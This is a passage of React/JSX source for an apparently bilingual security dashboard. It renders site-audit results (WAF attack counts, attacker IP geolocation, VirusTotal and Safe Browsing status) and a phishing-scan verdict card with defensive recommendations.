          const gsb = currentResult.details?.google_safebrowsing;
          const rawAdvice = (currentResult.details?.defensive_advice && currentResult.details.defensive_advice.length > 0) 
            ? currentResult.details.defensive_advice 
            : [
                lang === 'fr' ? "Ne cliquez pas sur les liens suspects ou les pièces jointes non vérifiées." : "Do not click on suspicious links or unverified attachments.",
                lang === 'fr' ? "Vérifiez toujours le nom de domaine officiel avant d'entrer vos identifiants." : "Always verify official domain name before entering credentials.",
                lang === 'fr' ? "Signalez tout incident au Centre de Réponse aux Incidents CyberGuard." : "Report any incident to CyberGuard Incident Response Center."
              ];
          const advice = rawAdvice.map(item => {
            let str = item.replace(/PhishGuard/gi, "CyberGuard");
            if (lang === 'en') {
              if (str.includes("Ne cliquez pas")) return "Do not click on suspicious links or unverified attachments.";
              if (str.includes("Vérifiez toujours")) return "Always verify official domain name before entering credentials.";
              if (str.includes("Signalez tout incident")) return "Report any security incident to CyberGuard Incident Response Center.";
              if (str.includes("Activez un Pare-feu")) return "Enable Web Application Firewall (WAF) to block SQLi and XSS.";
              if (str.includes("Mettez en place")) return "Implement rate-limiting and alert system on APIs.";
              if (str.includes("Exécutez un audit")) return "Run regular vulnerability audits on server directories.";
              if (str.includes("Aucune attaque active")) return "No active attacks recorded on this domain. Keep SSL certificates up to date.";
              if (str.includes("surveiller les journaux")) return "Remember to monitor CyberGuard web access logs.";
            }
            return str;
          });
          const techInspection = currentResult.details?.technical_inspection;
          const score = typeof currentResult.riskScore === 'number' ? currentResult.riskScore : parseFloat(currentResult.riskScore) || 0;
          const riskTier = score >= 88 ? (lang === 'fr' ? 'CRITIQUE' : 'CRITICAL') : score >= 70 ? (lang === 'fr' ? 'ÉLEVÉ' : 'HIGH') : score >= 45 ? (lang === 'fr' ? 'MODÉRÉ' : 'MODERATE') : (lang === 'fr' ? 'FAIBLE' : 'LOW');
          const testsCount = (models.length > 0 ? 1 : 0) + (Object.keys(features).length > 0 ? 1 : 0) + 2 + (geoip ? 1 : 0) + (techInspection ? 1 : 0);

          // ── SITE AUDIT RESULT CARD (Vérifier Mon Site) ──────────────────────────
          if (currentResult.details?.site_audit === true) {
            const d = currentResult.details;
            const attackCount = d.total_attacks_logged || 0;
            const hasAttacks = attackCount > 0;
            const breakdown = d.attack_breakdown || {};
            const attackers = d.traced_attackers || [];
            const siteVt = d.virustotal || {};
            const siteGsb = d.google_safebrowsing || {};

            const attackColors = {
              'SQL_INJECTION': 'text-rose-500', 'XSS': 'text-amber-500',
              'PATH_TRAVERSAL': 'text-orange-500', 'BRUTE_FORCE': 'text-red-400',
              'LOG4J_INJECTION': 'text-purple-500', 'DNS_TUNNELING': 'text-sky-400',
              'RANSOMWARE': 'text-rose-600', 'BENIGN': 'text-emerald-500',
            };

            return (
              <div className="mt-8 bg-white dark:bg-[#161b27] border border-slate-200 dark:border-slate-800/80 rounded-3xl shadow-2xl overflow-hidden transition-all duration-300 animate-in fade-in slide-in-from-top-4">

                {/* Status Stripe */}
                <div className={`h-1.5 w-full ${hasAttacks ? 'bg-gradient-to-r from-rose-500 via-red-500 to-amber-500' : 'bg-gradient-to-r from-emerald-400 via-teal-500 to-sky-500'}`} />

                <div className="p-6 sm:p-8 space-y-6">

                  {/* ── HEADER ── */}
                  <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-6 pb-6 border-b border-slate-100 dark:border-slate-800/80">
                    <div className="space-y-2">
                      <div className="flex flex-wrap items-center gap-2">
                        <span className="px-2.5 py-1 bg-indigo-50 dark:bg-indigo-950/40 text-indigo-600 dark:text-indigo-400 border border-indigo-200/60 dark:border-indigo-800/60 rounded-lg text-[10px] font-bold font-mono uppercase tracking-wider">
                          AUDIT SÉCURITÉ SITE
                        </span>
                        <span className="px-2.5 py-1 bg-sky-50 dark:bg-sky-950/50 text-sky-600 dark:text-sky-400 border border-sky-200/60 dark:border-sky-800/60 rounded-lg text-[10px] font-bold font-mono">
                          Moteur WAF + VirusTotal + GSB
                        </span>
                        <span className="text-[11px] text-slate-400 font-mono">{currentResult.timestamp}</span>
                      </div>
                      <div className="flex items-center gap-3 pt-1">
                        <div className={`p-3 rounded-2xl shrink-0 ${hasAttacks ? 'bg-rose-50 dark:bg-rose-950/40 text-rose-600 dark:text-rose-400 border border-rose-200 dark:border-rose-900/60' : 'bg-emerald-50 dark:bg-emerald-950/40 text-emerald-600 dark:text-emerald-400 border border-emerald-200 dark:border-emerald-900/60'}`}>
                          {hasAttacks ? <ShieldAlert className="w-7 h-7" /> : <ShieldCheck className="w-7 h-7" />}
                        </div>
                        <div>
                          <h3 className="text-xl sm:text-2xl font-black text-slate-900 dark:text-white tracking-tight">
                            {hasAttacks ? `${attackCount} Attaque(s) Détectée(s) sur ce Domaine` : 'Domaine Conforme — Aucune Attaque Enregistrée'}
                          </h3>
                          <p className="text-xs text-slate-500 dark:text-slate-400 mt-0.5 font-sans">
                            {hasAttacks
                              ? 'Des attaques actives ont été journalisées sur ce domaine. Consultez le détail ci-dessous.'
                              : 'Aucun événement malveillant enregistré dans les logs WAF pour ce domaine.'}
                          </p>
                        </div>
                      </div>
                    </div>

                    <div className={`p-4 sm:p-5 rounded-2xl border flex items-center gap-5 shrink-0 ${hasAttacks ? 'bg-rose-50/50 dark:bg-rose-950/20 border-rose-200 dark:border-rose-900/40' : 'bg-emerald-50/50 dark:bg-emerald-950/20 border-emerald-200 dark:border-emerald-900/40'}`}>
                      <div>
                        <div className="flex items-baseline gap-1.5 font-mono">
                          <span className={`text-3xl sm:text-4xl font-black ${hasAttacks ? 'text-rose-600 dark:text-rose-400' : 'text-emerald-600 dark:text-emerald-400'}`}>{attackCount}</span>
                          <span className="text-[11px] text-slate-400 font-sans font-bold">attaques</span>
                        </div>
                        <span className="text-[10px] uppercase font-mono font-bold tracking-wider text-slate-500 block mt-0.5">Événements Journalisés</span>
                      </div>
                      <div className="h-10 w-[1px] bg-slate-200 dark:bg-slate-700/60" />
                      <div>
                        <span className={`px-2.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-wider block text-center ${hasAttacks ? 'bg-rose-600 text-white shadow-sm shadow-rose-600/30' : 'bg-emerald-600 text-white shadow-sm shadow-emerald-600/30'}`}>
                          {hasAttacks ? 'MENACES ACTIVES' : 'SITE SAIN'}
                        </span>
                        <p className="text-[10px] text-slate-400 font-mono text-center mt-1">Score Risque: {currentResult.riskScore}%</p>
                      </div>
                    </div>
                  </div>

                  {/* ── TARGET DOMAIN BAR ── */}
                  <div className="bg-slate-50 dark:bg-[#111622] border border-slate-200 dark:border-slate-800 rounded-2xl p-4 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                    <div className="flex items-center gap-3 overflow-hidden">
                      <div className="p-2 bg-indigo-500/10 text-indigo-500 rounded-xl shrink-0"><Globe className="w-4 h-4" /></div>
                      <div className="overflow-hidden">
                        <span className="text-[10px] uppercase font-mono font-bold text-slate-400 block">Domaine Audité</span>
                        <p className="text-xs sm:text-sm font-mono font-bold text-slate-900 dark:text-slate-100 truncate">{currentResult.target}</p>
                      </div>
                    </div>
                    <button onClick={() => copyToClipboard(currentResult.target, 'url')} className="px-3 py-1.5 rounded-lg bg-white dark:bg-slate-800 border border-slate-200 dark:border-slate-700 hover:bg-slate-100 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-200 text-xs font-bold flex items-center gap-1.5 transition cursor-pointer shrink-0">
                      {copiedUrl ? <Check className="w-3.5 h-3.5 text-emerald-500" /> : <Copy className="w-3.5 h-3.5" />}
                      <span>{copiedUrl ? (lang === 'fr' ? 'Copié !' : 'Copied!') : (lang === 'fr' ? 'Copier' : 'Copy')}</span>
                    </button>
                  </div>

                  {/* ── BLOCK 1: ATTACK BREAKDOWN ── */}
                  <div className="rounded-2xl border border-slate-200 dark:border-slate-800 overflow-hidden">
                    <div className="flex items-center gap-2 px-4 py-3 bg-gradient-to-r from-rose-50 to-slate-50 dark:from-rose-950/20 dark:to-slate-900/40 border-b border-slate-200 dark:border-slate-800">
                      <div className="w-6 h-6 rounded-lg bg-rose-500 flex items-center justify-center text-white text-[10px] font-black shrink-0">1</div>
                      <Activity className="w-4 h-4 text-rose-500" />
                      <span className="text-xs font-extrabold text-slate-800 dark:text-white font-mono uppercase tracking-wide">Journaux WAF — Analyse des Types d'Attaques</span>
                      <span className={`ml-auto text-[10px] font-mono font-bold px-2 py-0.5 rounded border ${hasAttacks ? 'bg-rose-500/10 text-rose-600 dark:text-rose-400 border-rose-500/20' : 'bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border-emerald-500/20'}`}>
                        {attackCount} événement(s)
                      </span>
                    </div>
                    <div className="p-4">
                      {!hasAttacks ? (
                        <div className="flex flex-col items-center justify-center py-8 text-center gap-3">
                          <ShieldCheck className="w-12 h-12 text-emerald-400 opacity-60" />
                          <p className="text-sm font-bold text-emerald-600 dark:text-emerald-400">Aucune attaque journalisée pour ce domaine</p>
                          <p className="text-xs text-slate-400 max-w-sm">Les journaux de télémétrie WAF ne contiennent aucun événement malveillant enregistré ciblant {currentResult.target}.</p>
                          <button
                            onClick={() => handleSimulateAttack(currentResult.target)}
                            disabled={isSimulatingAttack}
                            className="mt-2 px-4 py-2.5 bg-gradient-to-r from-rose-500 to-amber-500 hover:from-rose-600 hover:to-amber-600 text-white font-mono font-bold text-xs rounded-xl shadow-md shadow-rose-500/20 flex items-center gap-2 cursor-pointer transition transform active:scale-95 disabled:opacity-50"
                          >
                            <Zap className="w-4 h-4" />
                            <span>{isSimulatingAttack ? 'Injection WAF en cours...' : "⚡ Simuler une Attaque en Direct (Test Traçabilité SQLi / XSS)"}</span>
                          </button>
                        </div>
                      ) : (
                        <div className="space-y-4">
                          <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-3">
                            {Object.entries(breakdown).map(([type, count], i) => (
                              <div key={i} className="bg-slate-50 dark:bg-[#111622] border border-slate-200 dark:border-slate-800 rounded-xl p-3.5 space-y-2 text-center">
                                <span className={`text-2xl font-black font-mono block ${attackColors[type] || 'text-rose-500'}`}>{count}</span>
                                <span className="text-[9px] font-mono uppercase tracking-wider text-slate-500 block leading-tight">{type.replace(/_/g, ' ')}</span>
                              </div>
                            ))}
                          </div>
                          <div className="flex justify-end pt-1">
                            <button
                              onClick={() => handleSimulateAttack(currentResult.target)}
                              disabled={isSimulatingAttack}
                              className="text-[11px] font-mono font-bold text-rose-500 hover:text-rose-600 flex items-center gap-1.5 transition cursor-pointer"
                            >
                              <Zap className="w-3.5 h-3.5" />
                              <span>{isSimulatingAttack ? 'Simulation...' : "+ Simuler une nouvelle attaque pour tester l'alerte"}</span>
                            </button>
                          </div>
                        </div>
                      )}
                    </div>
                  </div>

                  {/* ── BLOCK 2: TRACED ATTACKER IPs ── */}
                  {attackers.length > 0 && (
                    <div className="rounded-2xl border border-slate-200 dark:border-slate-800 overflow-hidden">
                      <div className="flex items-center gap-2 px-4 py-3 bg-gradient-to-r from-amber-50 to-slate-50 dark:from-amber-950/20 dark:to-slate-900/40 border-b border-slate-200 dark:border-slate-800">
                        <div className="w-6 h-6 rounded-lg bg-amber-500 flex items-center justify-center text-white text-[10px] font-black shrink-0">2</div>
                        <MapPin className="w-4 h-4 text-amber-500" />
                        <span className="text-xs font-extrabold text-slate-800 dark:text-white font-mono uppercase tracking-wide">Attaquants Tracés — GeoIP & ASN Intelligence</span>
                        <span className="ml-auto text-[10px] font-mono font-bold px-2 py-0.5 rounded bg-amber-500/10 text-amber-600 dark:text-amber-400 border border-amber-500/20">{attackers.length} IP(s)</span>
                      </div>
                      <div className="p-4 space-y-2">
                        {attackers.slice(0, 6).map((atk, i) => (
                          <div key={i} className="p-3.5 bg-slate-50 dark:bg-[#111622] border border-slate-200 dark:border-slate-800 rounded-xl text-xs font-mono space-y-2">
                            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-200/60 dark:border-slate-800/60 pb-2">
                              <div className="flex items-center gap-2.5">
                                <span className={`w-2.5 h-2.5 rounded-full shrink-0 ${atk.severity === 'CRITICAL' ? 'bg-rose-600 animate-ping' : atk.severity === 'HIGH' ? 'bg-rose-500' : 'bg-amber-400'}`} />
                                <span className="font-black text-sky-600 dark:text-sky-400 text-sm">{atk.ip}</span>
                                <span className={`px-2 py-0.5 rounded text-[10px] font-black border ${attackColors[atk.attack] ? 'bg-rose-500/10 text-rose-600 dark:text-rose-400 border-rose-500/20' : 'bg-amber-500/10 text-amber-600 dark:text-amber-400 border-amber-500/20'}`}>
                                  {atk.attack?.replace(/_/g, ' ')}
                                </span>
                              </div>
                              <div className="flex items-center gap-2 text-slate-400 text-[11px]">
                                <Clock className="w-3.5 h-3.5 text-slate-400" />
                                <span>{atk.timestamp || 'Récemment'}</span>
                              </div>
                            </div>

                            <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 text-[11px] text-slate-600 dark:text-slate-300">
                              <div className="flex items-center gap-2">
                                <span className="text-slate-400 font-bold uppercase text-[9px]">Origine Réseau :</span>
                                <span className="truncate">📍 {atk.country}{atk.city && atk.city !== 'Unknown' ? `, ${atk.city}` : ''} ({atk.asn || 'ASN Inconnu'})</span>
                                {atk.is_vpn_proxy && <span className="px-1.5 py-0.2 bg-amber-500/20 text-amber-600 dark:text-amber-400 rounded text-[9px] font-bold">VPN/Proxy</span>}
                              </div>
                              <div className="flex items-center gap-2">
                                <span className="text-slate-400 font-bold uppercase text-[9px]">Cible Web :</span>
                                <span className="font-bold text-slate-800 dark:text-slate-200 truncate">{atk.http_method || 'POST'} {atk.request_path || '/login'}</span>
                                <span className={`px-1.5 py-0.5 rounded text-[9px] font-bold ${atk.status_code === 403 ? 'bg-emerald-500/10 text-emerald-600 dark:text-emerald-400' : 'bg-rose-500/10 text-rose-600 dark:text-rose-400'}`}>
                                  {atk.status_code === 403 ? '403 Bloqué (WAF)' : `${atk.status_code || 403} Détecté`}
                                </span>
                              </div>
                            </div>

                            {atk.payload && (
                              <div className="p-2 bg-slate-900 text-rose-300 rounded-lg text-[10px] font-mono break-all border border-rose-900/30 flex items-start gap-2">
                                <span className="text-rose-500 font-bold uppercase text-[9px] shrink-0">Payload injecté :</span>
                                <span className="select-all">{atk.payload}</span>
                              </div>
                            )}
                          </div>
                        ))}
                        {attackers.length > 6 && (
                          <p className="text-[10px] font-mono text-slate-400 text-center pt-1">+ {attackers.length - 6} autres attaquants tracés</p>
                        )}
                      </div>
                    </div>
                  )}

                  {/* ── BLOCK 3: THREAT INTELLIGENCE (VT + GSB) ── */}
                  <div className="rounded-2xl border border-slate-200 dark:border-slate-800 overflow-hidden">
                    <div className="flex items-center gap-2 px-4 py-3 bg-gradient-to-r from-purple-50 to-slate-50 dark:from-purple-950/20 dark:to-slate-900/40 border-b border-slate-200 dark:border-slate-800">
                      <div className="w-6 h-6 rounded-lg bg-purple-500 flex items-center justify-center text-white text-[10px] font-black shrink-0">{attackers.length > 0 ? 3 : 2}</div>
                      <ShieldCheck className="w-4 h-4 text-purple-500" />
                      <span className="text-xs font-extrabold text-slate-800 dark:text-white font-mono uppercase tracking-wide">Threat Intelligence — VirusTotal & Google Safe Browsing</span>
                    </div>
                    <div className="p-4 grid grid-cols-1 sm:grid-cols-2 gap-3">
                      <div className={`p-4 rounded-xl border space-y-3 ${(siteVt?.positives || 0) > 0 ? 'bg-rose-50 dark:bg-rose-950/10 border-rose-200 dark:border-rose-800/40' : 'bg-emerald-50 dark:bg-emerald-950/10 border-emerald-200 dark:border-emerald-800/40'}`}>
                        <div className="flex items-center justify-between">
                          <div className="flex items-center gap-2">
                            <span className="text-xl">🔬</span>
                            <div><p className="text-xs font-black text-slate-800 dark:text-white">VirusTotal</p><p className="text-[10px] text-slate-400">{lang === 'fr' ? '90 moteurs antivirus mondiaux' : '90 global antivirus engines'}</p></div>
                          </div>
                          <span className={`px-2 py-0.5 rounded-md text-[10px] font-mono font-bold border ${(siteVt?.positives || 0) > 0 ? 'bg-rose-500/10 text-rose-600 dark:text-rose-400 border-rose-500/20' : 'bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border-emerald-500/20'}`}>
                            {(siteVt?.positives || 0) > 0 ? '⚠️ DÉTECTÉ' : '✓ PROPRE'}
                          </span>
                        </div>
                        <div className="space-y-2 text-[11px] font-mono">
                          <div className="flex justify-between"><span className="text-slate-500">Détections</span><span className={`font-black ${(siteVt?.positives || 0) > 0 ? 'text-rose-600 dark:text-rose-400' : 'text-emerald-600 dark:text-emerald-400'}`}>{siteVt?.positives || 0} / {siteVt?.total_engines || 90}</span></div>
                          <div className="h-2 w-full bg-slate-200 dark:bg-slate-700 rounded-full overflow-hidden"><div className={`h-full rounded-full ${(siteVt?.positives || 0) > 0 ? 'bg-rose-500' : 'bg-emerald-500'}`} style={{ width: `${Math.min(100, ((siteVt?.positives || 0) / (siteVt?.total_engines || 90)) * 100)}%` }} /></div>
                          <p className="text-[9px] text-slate-400">Source : {siteVt?.source || 'VirusTotal Intelligence'}</p>
                        </div>
                      </div>
                      <div className={`p-4 rounded-xl border space-y-3 ${siteGsb?.is_flagged ? 'bg-rose-50 dark:bg-rose-950/10 border-rose-200 dark:border-rose-800/40' : 'bg-emerald-50 dark:bg-emerald-950/10 border-emerald-200 dark:border-emerald-800/40'}`}>
                        <div className="flex items-center justify-between">
                          <div className="flex items-center gap-2">
                            <span className="text-xl">🛡️</span>
                            <div><p className="text-xs font-black text-slate-800 dark:text-white">Google Safe Browsing</p><p className="text-[10px] text-slate-400">{lang === 'fr' ? 'Base mondiale malware & phishing' : 'Global malware & phishing database'}</p></div>
                          </div>
                          <span className={`px-2 py-0.5 rounded-md text-[10px] font-mono font-bold border ${siteGsb?.is_flagged ? 'bg-rose-500/10 text-rose-600 dark:text-rose-400 border-rose-500/20' : 'bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border-emerald-500/20'}`}>
                            {siteGsb?.is_flagged ? '⚠️ SIGNALÉ' : '✓ LISTE BLANCHE'}
                          </span>
                        </div>
                        <div className="space-y-2 text-[10px] font-mono text-slate-400">
                          <div className="flex justify-between"><span>Statut</span><span className={`font-black ${siteGsb?.is_flagged ? 'text-rose-600 dark:text-rose-400' : 'text-emerald-600 dark:text-emerald-400'}`}>{siteGsb?.is_flagged ? (lang === 'fr' ? 'MALICIEUX / SIGNALÉ' : 'MALICIOUS / FLAGGED') : (lang === 'fr' ? 'SÉCURISÉ / APPROUVÉ' : 'SECURE / APPROVED')}</span></div>
                          <div className="flex justify-between"><span>{lang === 'fr' ? 'Types de menace' : 'Threat Types'}</span><span className={`font-bold ${siteGsb?.threat_types?.length > 0 ? 'text-rose-500' : 'text-emerald-500'}`}>{siteGsb?.threat_types?.length > 0 ? siteGsb.threat_types.join(', ') : 'Aucun'}</span></div>
                          <p className="text-[9px] pt-1">Source : {siteGsb?.source || 'Google Safe Browsing'}</p>
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* ── BLOCK 4: SERVER HOST INFRASTRUCTURE (GeoIP/ASN) ── */}
                  {d.server_geo_info && (
                    <div className="rounded-2xl border border-slate-200 dark:border-slate-800 overflow-hidden">
                      <div className="flex items-center gap-2 px-4 py-3 bg-gradient-to-r from-sky-50 to-slate-50 dark:from-sky-950/20 dark:to-slate-900/40 border-b border-slate-200 dark:border-slate-800">
                        <div className="w-6 h-6 rounded-lg bg-sky-500 flex items-center justify-center text-white text-[10px] font-black shrink-0">{attackers.length > 0 ? 4 : 3}</div>
                        <MapPin className="w-4 h-4 text-sky-500" />
                        <span className="text-xs font-extrabold text-slate-800 dark:text-white font-mono uppercase tracking-wide">Infrastructure Serveur — Localisation Réseau & Hébergeur</span>
                        <span className="ml-auto text-[10px] font-mono font-bold px-2 py-0.5 rounded bg-sky-500/10 text-sky-600 dark:text-sky-400 border border-sky-500/20">Hôte Résolu Live</span>
                      </div>
                      <div className="p-4 space-y-3">
                        <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-2">
                          {[
                            { label: (lang === 'fr' ? 'Adresse IP' : 'IP Address'), value: d.server_geo_info.ip || 'N/A', icon: '🌐', highlight: 'text-sky-500' },
                            { label: (lang === 'fr' ? 'Pays (Apparent)' : 'Country (Apparent)'), value: d.server_geo_info.country || 'Inconnu', icon: '🏳️', highlight: '' },
                            { label: 'Ville / POP', value: d.server_geo_info.city || 'Inconnu', icon: '📍', highlight: '' },
                            { label: 'ASN', value: d.server_geo_info.asn || 'Inconnu', icon: '🔌', highlight: '' },
                            { label: 'Organisation', value: d.server_geo_info.org || 'Inconnu', icon: '🏢', highlight: '' },
                            {
                              label: 'Proxy / CDN',
                              value: d.server_geo_info.proxy_status_display || (d.server_geo_info.is_cdn ? 'CDN Anycast' : d.server_geo_info.is_vpn_proxy ? 'OUI — Anonymisé' : 'NON (Direct)'),
                              icon: d.server_geo_info.is_vpn_proxy ? '🔴' : d.server_geo_info.is_cdn ? '🔵' : '🟢',
                              risk: !!d.server_geo_info.is_vpn_proxy,
                              isCdn: !!d.server_geo_info.is_cdn,
                              highlight: '',
                            },
                          ].map((item, i) => (
                            <div key={i} className={`p-3 rounded-xl border text-center ${item.risk ? 'bg-rose-50 dark:bg-rose-950/10 border-rose-200 dark:border-rose-800/40' : item.isCdn ? 'bg-sky-50/60 dark:bg-sky-950/20 border-sky-200 dark:border-sky-800/40' : 'bg-slate-50 dark:bg-slate-900/60 border-slate-200 dark:border-slate-800'}`}>
                              <span className="text-base block mb-1">{item.icon}</span>
                              <span className={`text-[10px] font-black font-mono block leading-tight break-all ${item.risk ? 'text-rose-600 dark:text-rose-400' : item.isCdn ? 'text-sky-600 dark:text-sky-400' : item.highlight || 'text-slate-800 dark:text-slate-200'}`}>{item.value}</span>
                              <span className="text-[9px] text-slate-400 font-mono uppercase block mt-1">{item.label}</span>
                            </div>
                          ))}
                        </div>
                        {d.server_geo_info.disclaimer && <p className="text-[10px] text-slate-400 font-mono italic border-t border-slate-200 dark:border-slate-800 pt-2">ℹ️ {d.server_geo_info.disclaimer}</p>}
                      </div>
                    </div>
                  )}

                  {/* ── BLOCK 5: LIVE TECHNICAL INSPECTION (HTTP, SSL, HEADERS, DNS) ── */}
                  {d.technical_inspection && renderTechnicalDetails(d.technical_inspection, 5)}

                  {/* ── DEFENSIVE RECOMMENDATIONS ── */}
                  {advice.length > 0 && (
                    <div className="bg-sky-500/10 border border-sky-500/30 rounded-2xl p-5 space-y-2">
                      <h4 className="text-xs font-bold text-sky-600 dark:text-sky-400 uppercase font-mono tracking-wider flex items-center gap-2"><Sparkles className="w-4 h-4" /> Recommandations de Sécurité Site :</h4>
                      <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 pt-1 text-xs text-slate-800 dark:text-slate-200 font-sans">
                        {advice.map((item, idx) => (
                          <div key={idx} className="flex items-start gap-2 bg-white/60 dark:bg-slate-900/60 p-2.5 rounded-xl border border-sky-200/40 dark:border-sky-800/40">
                            <span className="text-sky-500 font-bold shrink-0">•</span><span className="leading-snug">{item}</span>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* ── DISCLAIMER ── */}
                  {d.disclaimer && (
                    <p className="text-[10px] text-slate-400 font-mono italic px-1">ℹ️ {d.disclaimer}</p>
                  )}

                  {/* ── ACTION TOOLBAR ── */}
                  <div className="pt-2 flex flex-col sm:flex-row items-center justify-between gap-3">
                    <button onClick={() => setIsReportModalOpen(true)} className="w-full sm:w-auto px-5 py-3 bg-slate-100 dark:bg-slate-800 hover:bg-slate-200 dark:hover:bg-slate-700 text-slate-800 dark:text-slate-200 font-bold text-xs rounded-2xl flex items-center justify-center gap-2 transition cursor-pointer">
                      <FileText className="w-4 h-4 text-sky-500" /><span>{lang === 'fr' ? 'Exporter la Fiche / PDF' : 'Export Report / PDF'}</span>
                    </button>
                    <button onClick={handleSendReport} disabled={isReporting} className="w-full sm:w-auto px-6 py-3 bg-rose-600 hover:bg-rose-700 disabled:opacity-50 text-white font-extrabold text-xs rounded-2xl shadow-lg shadow-rose-600/30 flex items-center justify-center gap-2 transition cursor-pointer">
                      {isReporting ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Send className="w-4 h-4" />}
                      <span>{lang === 'fr' ? "Transmettre ce Dossier à l'Enquêteur SOC" : "Forward Report to SOC Investigator"}</span>
                    </button>
                  </div>
                  {reportSuccess && (
                    <div className="p-3 bg-emerald-500/10 border border-emerald-500/30 text-emerald-600 dark:text-emerald-400 text-xs font-bold rounded-2xl flex items-center gap-2">
                      <CheckCircle2 className="w-4 h-4 shrink-0" /><span>{reportSuccess}</span>
                    </div>
                  )}

                </div>
              </div>
            );
          }

          // ── URL / TEXT PHISHING SCAN RESULT CARD (Vérifier une URL) ────────────
          return (
            <div className="mt-8 bg-white dark:bg-[#161b27] border border-slate-200 dark:border-slate-800/80 rounded-3xl shadow-2xl overflow-hidden transition-all duration-300 animate-in fade-in slide-in-from-top-4">
              
              {/* Status Stripe */}
              <div className={`h-1.5 w-full ${isThreat ? 'bg-gradient-to-r from-rose-500 via-red-500 to-amber-500' : 'bg-gradient-to-r from-emerald-400 via-teal-500 to-sky-500'}`} />

              <div className="p-6 sm:p-8 space-y-6">
                
                {/* ── HEADER: Verdict + Score ── */}
                <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-6 pb-6 border-b border-slate-100 dark:border-slate-800/80">
                  <div className="space-y-2">
                    <div className="flex flex-wrap items-center gap-2">
                      <span className="px-2.5 py-1 bg-slate-100 dark:bg-slate-800 text-slate-600 dark:text-slate-300 rounded-lg text-[10px] font-mono font-bold tracking-wider uppercase">
                        {currentResult.details?.analysis_code || 'ANL-SCAN'}
                      </span>
                      <span className="px-2.5 py-1 bg-sky-50 dark:bg-sky-950/50 text-sky-600 dark:text-sky-400 border border-sky-200/60 dark:border-sky-800/60 rounded-lg text-[10px] font-bold font-mono">
                        {lang === 'fr' ? 'Moteur IA Tri-Modèle' : 'Tri-Model AI Engine'}
                      </span>
                      <span className="px-2.5 py-1 bg-indigo-50 dark:bg-indigo-950/40 text-indigo-600 dark:text-indigo-400 border border-indigo-200/60 dark:border-indigo-800/60 rounded-lg text-[10px] font-bold font-mono">
                        {lang === 'fr' ? `${testsCount} Blocs de Tests` : `${testsCount} Test Blocks`}
                      </span>
                      <span className="text-[11px] text-slate-400 font-mono">{currentResult.timestamp}</span>
                    </div>
                    <div className="flex items-center gap-3 pt-1">
                      <div className={`p-3 rounded-2xl shrink-0 ${isThreat ? 'bg-rose-50 dark:bg-rose-950/40 text-rose-600 dark:text-rose-400 border border-rose-200 dark:border-rose-900/60' : 'bg-emerald-50 dark:bg-emerald-950/40 text-emerald-600 dark:text-emerald-400 border border-emerald-200 dark:border-emerald-900/60'}`}>
                        {isThreat ? <ShieldAlert className="w-7 h-7" /> : <ShieldCheck className="w-7 h-7" />}
                      </div>
                      <div>
                        <h3 className="text-xl sm:text-2xl font-black text-slate-900 dark:text-white tracking-tight">
                          {isThreat ? (lang === 'fr' ? 'Menace de Phishing / Malware Détectée' : 'Phishing / Malware Threat Detected') : (lang === 'fr' ? 'Contenu Légitime & Sécurisé' : 'Legitimate & Secure Content')}
                        </h3>
                        <p className="text-xs text-slate-500 dark:text-slate-400 mt-0.5 font-sans">
                          {isThreat ? (lang === 'fr' ? 'Indicateurs anormaux détectés. Blocage recommandé avant toute interaction.' : 'Anomalous indicators detected. Blocking recommended before interaction.') : (lang === 'fr' ? 'Aucune anomalie détectée sur la structure lexicale et les bases de renseignements.' : 'No anomalies detected on lexical structure or intelligence databases.')}
                        </p>
                      </div>
                    </div>
                  </div>

                  <div className={`p-4 sm:p-5 rounded-2xl border flex items-center gap-5 shrink-0 ${isThreat ? 'bg-rose-50/50 dark:bg-rose-950/20 border-rose-200 dark:border-rose-900/40' : 'bg-emerald-50/50 dark:bg-emerald-950/20 border-emerald-200 dark:border-emerald-900/40'}`}>
                    <div>
                      <div className="flex items-baseline gap-1.5 font-mono">
                        <span className={`text-3xl sm:text-4xl font-black ${isThreat ? 'text-rose-600 dark:text-rose-400' : 'text-emerald-600 dark:text-emerald-400'}`}>{score.toFixed(1)}%</span>
                        <span className="text-[11px] text-slate-400 font-sans font-bold">/ 100</span>
                      </div>
                      <span className="text-[10px] uppercase font-mono font-bold tracking-wider text-slate-500 block mt-0.5">{lang === 'fr' ? 'Indice de Risque' : 'Risk Index'}</span>
                    </div>
                    <div className="h-10 w-[1px] bg-slate-200 dark:bg-slate-700/60" />
                    <div className="space-y-1.5">
                      <span className={`px-2.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-wider block text-center ${isThreat ? 'bg-rose-600 text-white shadow-sm shadow-rose-600/30' : 'bg-emerald-600 text-white shadow-sm shadow-emerald-600/30'}`}>
                        {lang === 'fr' ? 'Niveau :' : 'Level:'} {riskTier}
                      </span>
                      <div className="flex gap-1 w-24">
                        <div className={`h-1.5 flex-1 rounded-full ${score >= 10 ? (isThreat ? 'bg-rose-500' : 'bg-emerald-500') : 'bg-slate-200 dark:bg-slate-700'}`} />
                        <div className={`h-1.5 flex-1 rounded-full ${score >= 35 ? (isThreat ? 'bg-rose-500' : 'bg-emerald-500') : 'bg-slate-200 dark:bg-slate-700'}`} />
                        <div className={`h-1.5 flex-1 rounded-full ${score >= 60 ? 'bg-rose-500' : 'bg-slate-200 dark:bg-slate-700'}`} />
                        <div className={`h-1.5 flex-1 rounded-full ${score >= 80 ? 'bg-rose-600' : 'bg-slate-200 dark:bg-slate-700'}`} />
                      </div>
                    </div>
                  </div>
                </div>

                {/* ── TARGET BAR ── */}
                <div className="bg-slate-50 dark:bg-[#111622] border border-slate-200 dark:border-slate-800 rounded-2xl p-4 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                  <div className="flex items-center gap-3 overflow-hidden">
